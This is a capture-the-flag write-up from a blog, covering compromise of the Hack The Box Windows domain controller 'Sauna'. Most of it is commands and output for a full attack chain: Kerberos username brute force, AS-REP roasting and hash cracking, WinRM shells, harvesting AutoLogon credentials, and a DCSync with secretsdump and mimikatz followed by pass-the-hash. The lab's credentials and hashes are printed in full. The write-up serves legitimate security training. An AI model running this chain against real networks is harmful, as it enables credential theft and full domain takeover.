---
title: HTB: Sauna
url: https://0xdf.gitlab.io/2020/07/18/htb-sauna.html
date: 2020-07-18T13:45:00+00:00
difficulty: Easy [20]
os: Windows
tags: ctf, hackthebox, htb-sauna, nmap, windows, ldapsearch, ldap, kerberos, seclists, as-rep-roast, getnpusers, hashcat, evil-winrm, smbserver, winpeas, autologon-credentials, bloodhound, sharphound, neo4j, dcsync, secretsdump, mimikatz, wmiexec, psexec, oscp-plus-v2, oscp-like-v3
---

![Sauna](https://0xdfimages.gitlab.io/img/sauna-cover.png)

Sauna was a neat chance to play with Windows Active Directory concepts packaged into an easy difficulty box. I’ll start by using a Kerberoast brute force on usernames to identify a handful of users, and then find that one of them has the flag set to allow me to grab their hash without authenticating to the domain. I’ll AS-REP Roast to get the hash, crack it, and get a shell. I’ll find the next users credentials in the AutoLogon registry key. BloodHound will show that user has privileges the allow it to perform a DC Sync attack, which provides all the domain hashes, including the administrators, which I’ll use to get a shell.

## Box Info

| Name | [Sauna](https://hackthebox.com/machines/sauna)  [Sauna](https://hackthebox.com/machines/sauna) [Play on HackTheBox](https://hackthebox.com/machines/sauna) |
| --- | --- |
| Release Date | [15 Feb 2020](https://twitter.com/hackthebox_eu/status/1227905924687372288) |
| Retire Date | 18 Jul 2020 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Sauna |
| Radar Graph | Radar chart for Sauna |
| First Blood User | 00:17:42[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| First Blood Root | 01:03:28[x4nt0n x4nt0n](https://app.hackthebox.com/users/38547) |
| Creator | [egotisticalSW egotisticalSW](https://app.hackthebox.com/users/94858) |

## Recon

### nmap

`nmap` shows 20 open TCP ports which are typical for a Windows server and likely a Domain Controller:

```

root@kali# nmap -p- --min-rate 10000 10.10.10.175
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-15 14:11 EST 
Nmap scan report for 10.10.10.175
Host is up (0.027s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE                    
53/tcp    open  domain 
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds                          
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP              
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49681/tcp open  unknown
64471/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 33.29 seconds

root@kali# nmap -p 53,80,88,135,139,389,445,464,593,3268,3269,5985 -sC -sV -oA scans/tcpscripts 10.10.10.175
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-15 14:20 EST
Nmap scan report for 10.10.10.175
Host is up (0.046s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-02-16 03:21:43Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=2/15%Time=5E4844A2%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h00m40s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-02-16T03:24:01
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 244.38 seconds

```

The [IIS server version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions) suggests this is a Windows 10 / Server 2016 / Server 2019 machine.

The LDAP scripts show a domain name of `EGOTISTICAL-BANK.LOCAL0`. I’ll explore that more.

### Website - TCP 80

#### Site

The page represents a bank:

[![](https://0xdfimages.gitlab.io/img/image-20200216121629882.png)](https://0xdfimages.gitlab.io/img/image-20200216121629882.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200216121629882.png)

Just scrolling around, nothing interested jumps out. All the pages are static, and the forms don’t work. There isn’t much of value here. On the “About Us” page, there’s a list of the team:

![image-20200216121753153](https://0xdfimages.gitlab.io/img/image-20200216121753153.png)

I made of note of this in case I wanted to brute force something later, but I didn’t need it.

#### Directory Brute Force

While looking at the site, I also had `gobuster` running, but it didn’t find anything interesting either:

```

root@kali# gobuster dir -u http://10.10.10.175/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster-root -t 40
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.175/
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/02/15 14:15:03 Starting gobuster
===============================================================
/images (Status: 301)
/Images (Status: 301)
/css (Status: 301)
/fonts (Status: 301)
/IMAGES (Status: 301)
/Fonts (Status: 301)
/CSS (Status: 301)
===============================================================
2020/02/15 14:22:17 Finished
===============================================================

```

### SMB - TCP 445

I’ll try anonymous connections to the SMB shares, but no love:

```

root@kali# smbmap -H 10.10.10.175
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.175...
[+] IP: 10.10.10.175:445        Name: 10.10.10.175                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
[!] Access Denied

root@kali# smbclient -N -L //10.10.10.175
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
smb1cli_req_writev_submit: called for dialect[SMB3_11] server[10.10.10.175]
Error returning browse list: NT_STATUS_REVISION_MISMATCH
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available

```

### LDAP - TCP/UDP 389

The `nmap` script did some basic enumeration and returned the domain `EGOTISTICAL-BANK.LOCAL0`. I’ll dig in a bit more with `ldapsearch`.

First the query to get the domain base is `ldapsearch -x -h 10.10.10.175 -s base namingcontexts`, where:
- `-x` - simple auth
- `-h 10.10.10.175` - host to query
- `-s base` - set the scope to base
- `naming contexts` - return naming contexts

This gives the domain, `EGOTISTICAL-BANK.LOCAL`:

```

root@kali# ldapsearch -x -h 10.10.10.175 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```

Now I can use `-b 'DC=EGOTISTICAL-BANK,DC=LOCAL'` to get information about the domain:

```

root@kali# ldapsearch -x -h 10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'
# extended LDIF
#
# LDAPv3
# base <DC=EGOTISTICAL-BANK,DC=LOCAL> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# EGOTISTICAL-BANK.LOCAL
dn: DC=EGOTISTICAL-BANK,DC=LOCAL                      
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
instanceType: 5
whenCreated: 20200123054425.0Z
whenChanged: 20200216124516.0Z
subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
...[snip]...

```

There’s a bunch of information there, but I didn’t end up using it.

### DNS - TCP/UDP 53

Any time I see DNS, it’s worth trying a Zone-Transfer. Both `sauna.htb` and `egotistical-bank.local` failed to return anything:

```

root@kali# dig axfr @10.10.10.175 sauna.htb
; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> axfr @10.10.10.175 sauna.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.

root@kali# dig axfr @10.10.10.175 egotistical-bank.local
; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> axfr @10.10.10.175 egotistical-bank.local
; (1 server found)
;; global options: +cmd
; Transfer failed.

```

### Kerberos - UDP (and TCP) 88

Without creds, one thing I can check on Kerberos is brute-focing user names. I’ll use [Kerbrute](https://github.com/ropnop/kerbrute) to give this a run, and it finds four unique usernames:

```

root@kali# kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 02/15/20 - Ronnie Flathers @ropnop

2020/02/15 14:41:50 >  Using KDC(s):
2020/02/15 14:41:50 >   10.10.10.175:88

2020/02/15 14:41:59 >  [+] VALID USERNAME:       administrator@EGOTISTICAL-BANK.LOCAL
2020/02/15 14:42:46 >  [+] VALID USERNAME:       hsmith@EGOTISTICAL-BANK.LOCAL
2020/02/15 14:42:54 >  [+] VALID USERNAME:       Administrator@EGOTISTICAL-BANK.LOCAL
2020/02/15 14:43:21 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2020/02/15 14:47:43 >  [+] VALID USERNAME:       Fsmith@EGOTISTICAL-BANK.LOCAL
2020/02/15 16:01:56 >  [+] VALID USERNAME:       sauna@EGOTISTICAL-BANK.LOCAL
2020/02/16 03:13:54 >  [+] VALID USERNAME:       FSmith@EGOTISTICAL-BANK.LOCAL
2020/02/16 03:13:54 >  [+] VALID USERNAME:       FSMITH@EGOTISTICAL-BANK.LOCAL
2020/02/16 03:24:34 >  Done! Tested 8295455 usernames (8 valid) in 17038.364 seconds

```

fsmith is likely Fergus Smith:

![image-20200714124609305](https://0xdfimages.gitlab.io/img/image-20200714124609305.png)

I used a list of usernames from [Seclists](https://github.com/danielmiessler/SecLists) to do the brute to see if anything came out before trying to convert the names from the team page into a format. In a CTF, it makes sense to try a broad list first since it’s easier and noise doesn’t matter. If this were a real company, I’d probably try variations of the names, or look on social media to try to find a corporate email for the employees to get the username format first.

I made a list of the other users in the same format, `[first initial][lastname]`:

```

fsmith
scoins
sdriver
btayload
hbear
skerb

```

I ran it through `kerbrute`, but none of the other users exist.

## Shell as fsmith

### AS-REP Roasting Background

m0chan has a [great post on attacking Kerberos](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#as-rep-roasting) that includes AS-REP Roasting. Typically, when you try to request authentication through Kerberos, first the requesting party has to authenticate itself to the DC. But there is an option, `DONT_REQ_PREAUTH` where the DC will just send the hash to an unauthenticated user. AS-REP Roasting is looking to see if any known users happen to have this option set.

### Get Hash

I’ll use the list of users I collected from Kerbrute, and run `GetNPUsers.py` to look for vulnerable users. Three come back as not vulnerable, but one gives a hash:

```

root@kali# GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sauna doesn't have UF_DONT_REQUIRE_PREAUTH set

root@kali# cat hashes.aspreroast 
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a89b6e78741dfb23312bc04c1892e558$a9aff5e5a5080949e6e4f4bbd690230277b586e7717b3328a80b636872f77b9deb765e5e6fab3c51b4414452bc4d4ad4a1705b2c5c42ea584bfe170fa8f54a89a095c3829e489609d74fd10a124dbf8445a1de2ed213f4682a679ab654d0344ff869b959c79677790e99268944acd41c628e70491487ffb6bcef332b74706ccecf70f64af110897b852d3a8e7b3e55c740c879669481115685915ec251e0316b682a5ca1c77b5294efae72d3642117d84429269f5eaea23c3b01b6beaf59c63ffaf5994e180e467de8675928929b754db7fc8c7e773da473649af149def29e5ffb5f94b5cb7912b68ccbee741b6e205ce8388d973b9b59cf7c8606de4bb149c0

```

### Crack Hash

Now I just need to kick this over to `hashcat` for cracking, and it works:

```

root@kali# hashcat -m 18200 hashes.aspreroast /usr/share/wordlists/rockyou.txt --force
hashcat (v5.1.0) starting...
...[snip]...
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a89b6e78741dfb23312bc04c1892e558$a9aff5e5a5080949e6e4f4bbd690230277b586e7717b3328a80b636872f77b9deb765e5e6fab3c51b4414452bc4d4ad4a1705b2c5c42ea584bfe170fa8f54a89a095c3829e489609d74fd10a124dbf8445a1de2ed213f4682a679ab654d0344ff869b959c79677790e99268944acd41c628e70491487ffb6bcef332b74706ccecf70f64af110897b852d3a8e7b3e55c740c879669481115685915ec251e0316b682a5ca1c77b5294efae72d3642117d84429269f5eaea23c3b01b6beaf59c63ffaf5994e180e467de8675928929b754db7fc8c7e773da473649af149def29e5ffb5f94b5cb7912b68ccbee741b6e205ce8388d973b9b59cf7c8606de4bb149c0:Thestrokes23
...[snip]...

```

It returns the password, Thestrokes23.

### Evil-WinRM

If I didn’t already have [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) installed, I could install it with `gem install evil-winrm`. Now I’ll use it to get a shell:

```

root@kali# evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents>

```

And get `user.txt`:

```
*Evil-WinRM* PS C:\Users\FSmith\desktop> type user.txt
1b5520b9************************

```

## Priv: fsmith –> svc\_loanmgr

### Enumeration

For Windows enumeration, I’ll run `WinPEAS.exe` from the [Privilege Escalation Awesome Scripts Suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite). I’ll put a copy in a folder and then create an SMB share with `smbserver.py`:

```

root@kali# smbserver.py -username df -password df share . -smb2support
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

Now I can mount the share from Sauna and go into that directory:

```
*Evil-WinRM* PS C:\> net use \\10.10.14.30\share /u:df df
The command completed successfully.
*Evil-WinRM* PS C:\> cd \\10.10.14.30\share\
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.30\share>

```

I’ll run `winPEAS.exe` such that the results are written to the share:

```
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.30\share> .\winPEAS.exe cmd fast > sauna_winpeas_fast

```

In looking through the results, AutoLogon credentials jumped out as interesting:

```

  [+] Looking for AutoLogon credentials(T1012)
Some AutoLogon credentials were found!!
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!     

```

I can see this manually by reading the registry with PowerShell:

```
*Evil-WinRM* PS HKLM:\software\microsoft\windows nt\currentversion\winlogon> get-item -path .

    Hive: HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion

Name                           Property
----                           --------
winlogon                       AutoRestartShell             : 1
                               Background                   : 0 0 0
                               CachedLogonsCount            : 10
                               DebugServerCommand           : no
                               DefaultDomainName            : EGOTISTICALBANK
                               DefaultUserName              : EGOTISTICALBANK\svc_loanmanager  <-- username
                               DisableBackButton            : 1
                               EnableSIHostIntegration      : 1
                               ForceUnlockLogon             : 0
                               LegalNoticeCaption           :
                               LegalNoticeText              :
                               PasswordExpiryWarning        : 5
                               PowerdownAfterShutdown       : 0
                               PreCreateKnownFolders        : {A520A1A4-1780-4FF6-BD18-167343C5AF16}
                               ReportBootOk                 : 1
                               Shell                        : explorer.exe
                               ShellCritical                : 0
                               ShellInfrastructure          : sihost.exe
                               SiHostCritical               : 0
                               SiHostReadyTimeOut           : 0
                               SiHostRestartCountLimit      : 0
                               SiHostRestartTimeGap         : 0
                               Userinit                     : C:\Windows\system32\userinit.exe,
                               VMApplet                     : SystemPropertiesPerformance.exe /pagefile
                               WinStationsDisabled          : 0
                               scremoveoption               : 0
                               DisableCAD                   : 1
                               LastLogOffEndTimePerfCounter : 808884164
                               ShutdownFlags                : 19
                               DisableLockWorkstation       : 0
                               DefaultPassword              : Moneymakestheworldgoround!  <-- password

```

`reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon"` would also dump this data.

### Evil-WinRM

Running `net user` on the box showed there was no user `svc_loanmanager`:

```
*Evil-WinRM* PS C:\> net user

User accounts for \\                                  
-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
The command completed with one or more errors.

```

But `svc_loanmgr` is pretty close.

I’ll try the creds with that user, and it works:

```

root@kali# evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'

Evil-WinRM shell v2.1

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents>

```

## Priv: svc\_loanmgr –> root

### Bloodhound

I ran `winPEAS.exe` again, but nothing new jumped out at me. Since there’s AD stuff going on, I went to [Bloodhound](https://github.com/BloodHoundAD/BloodHound).

### Download / Install

I’ll clone the repository into `/opt`, and also got the latest release binary. I’ll start `neo4j` (`apt install neo4j` if it’s not already installed) with `neo4j start`, and then run Bloodhound. If you’re running as root, you’ll need the `--no-sandbox` flag.

If it’s a fresh install (or if you forget your password from a previous install, you can delete `/usr/share/neo4j/data/dbms/auth` and then it’s like a fresh install), I’ll need to change the `neo4j` password by running `neo4j console`, visiting the url it returns, and logging in with the default creds, neo4j/neo4j. It’ll force a password change them at that point. Now the BloodHound program can connect, thought first I need data.

#### Run SharpHound.exe

Before I can do analysis in BloodHound, I need to collect some data. I’ll grab `SharpHound.exe` from the injestors folder, and make a copy in my SMB share. Then I can run it right from there, and the output will write into the share as well:

```
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.30\share> .\SharpHound.exe
-----------------------------------------------
Initializing SharpHound at 6:36 PM on 2/16/2020
-----------------------------------------------
                                                      
Resolved Collection Methods: Group, Sessions, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain EGOTISTICAL-BANK.LOCAL using path CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL  
[+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 19 MB RAM
Status: 60 objects finished (+60 30)/s -- Using 26 MB RAM
Enumeration finished in 00:00:02.1309648       
Compressing data to .\20200216183650_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 6:36 PM on 2/16/2020! Happy Graphing!

```

#### Analyze Results

I’ll import the `.zip` file into BloodHound by clicking the Upload Data button on the top right. Tt reports success, leaving me at a blank page. There are canned queries that might be useful, but I like to start with the user(s) I already have access to. I’ll search for SVC\_LOANMGR@EGOTISTICAL-BANK.LOCAL in the bar at the top left, and it comes up on the graph. On the left, I’ll want to look for Outbound Object Control - These are items that this user has rights over. In this case, there is one:

![image-20200715064800312](https://0xdfimages.gitlab.io/img/image-20200715064800312.png)

Clicking the “1” add that item to the graph:

![image-20200715064902861](https://0xdfimages.gitlab.io/img/image-20200715064902861.png)

This account has access to `GetChanges` and `GetChangesAll` on the domain. Googling that will quickly point to a low of articles on the DCSync attack, or I can right click on the label (you have to get in just the right spot) and get the menu for it:

![image-20200715065055665](https://0xdfimages.gitlab.io/img/image-20200715065055665.png)

Clicking help, there’s a Abuse Info tab that includes instructions for how to abuse this privilege:

![image-20200715065136856](https://0xdfimages.gitlab.io/img/image-20200715065136856.png)

### DCSync

#### secretsdump

My preferred way to do a DCSync attack is using `secretsdump.py`, which allows me to run DCSync attack from my Kali box, provided I can talk to the DC on TCP 445 and 135 and a high RPC port. This avoids fighting with AV, though it does create network traffic.

I need to give it just a target string in the format `[username]:[password]@[ip]`:

```

root@kali# secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:7a2965077fddedf348d938e4fa20ea1b:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0
Administrator:des-cbc-md5:19d5f15d689b1ce5
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:a90968c91de5f77ac3b7d938bd760002373f71e14e1a027b2d93d1934d64754a
SAUNA$:aes128-cts-hmac-sha1-96:0bf0c486c1262ab6cf46b16dc3b1b198
SAUNA$:des-cbc-md5:b989ecc101ae4ca1
[*] Cleaning up... 

```

#### Mimikatz

I can also use [Mimikatz](https://github.com/gentilkiwi/mimikatz) like BloodHound suggested. I’ll download the latest release from the [release page](https://github.com/gentilkiwi/mimikatz/releases), and upload the 64-bit binary to Sauna:

```
*Evil-WinRM* PS C:\programdata> upload /opt/mimikatz/x64/mimikatz.exe    
Info: Uploading /opt/mimikatz/x64/mimikatz.exe to C:\programdata\mimikatz.exe

Data: 1685172 bytes of 1685172 bytes copied
                                                                         
Info: Upload successful! 

```

Mimikatz can be super finicky. Ideally I can run it and drop to a Mimikatz shell, but for some reason on Sauna it just started spitting the prompt at my repeatedly and I had to kill my session. It’s always safer to just run `mimikatz.exe` with the commands you want to run following it from the command line.

```
*Evil-WinRM* PS C:\programdata> .\mimikatz 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)           
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/ 

mimikatz(commandline) # lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator
[DC] 'EGOTISTICAL-BANK.LOCAL' will be the domain
[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server
[DC] 'administrator' will be the user account
                                                                         
Object RDN           : Administrator    
** SAM ACCOUNT **                                                        
                                                                         
SAM Username         : Administrator    
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :                                                   
Password last change : 1/24/2020 10:14:15 AM
Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500
Object Relative ID   : 500                                               
                                                                         
Credentials:                                                             
  Hash NTLM: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 0: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 1: 7facdc498ed1680c4fd1448319a8c04f
    lm  - 0: ee8c50e6bc332970a8e8a632488f5211
                                                                         
Supplemental Credentials:                                                
* Primary:NTLM-Strong-NTOWF *                                            
    Random Value : caab2b641b39e342e0bdfcd150b1683e
* Primary:Kerberos-Newer-Keys *                                          
    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
    Default Iterations : 4096                                            
    Credentials
...[snip]...

```

This spits out a *ton* of information. The hash I need (that matches the `secretsdump` output) is the Hash NTLM in the middle above. I could also use `/all` instead of `/user:administrator` to dump the entire user cache, but administrator is all I need here.

### Shells

I can use the administrator hash to WMI to get a shell as administrator:

```

root@kali# wmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip 10.10.10.175 administrator@10.10.10.175
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
egotisticalbank\administrator

```

Or PSExec to get a shell as SYSTEM:

```

root@kali# psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip 10.10.10.175 administrator@10.10.10.175
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.175.....
[*] Found writable share ADMIN$
[*] Uploading file TQeVYGvK.exe
[*] Opening SVCManager on 10.10.10.175.....
[*] Creating service bEUo on 10.10.10.175.....
[*] Starting service bEUo.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

```

Or I can even use EvilWinRM:

```

root@kali# evil-winrm -i 10.10.10.175 -u administrator -H d9485863c1e9e05851aa40cbb4ab9dff

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

Any way, I can grab `root.txt`:

```

C:\users\administrator\desktop>type root.txt
f3ee0496************************

```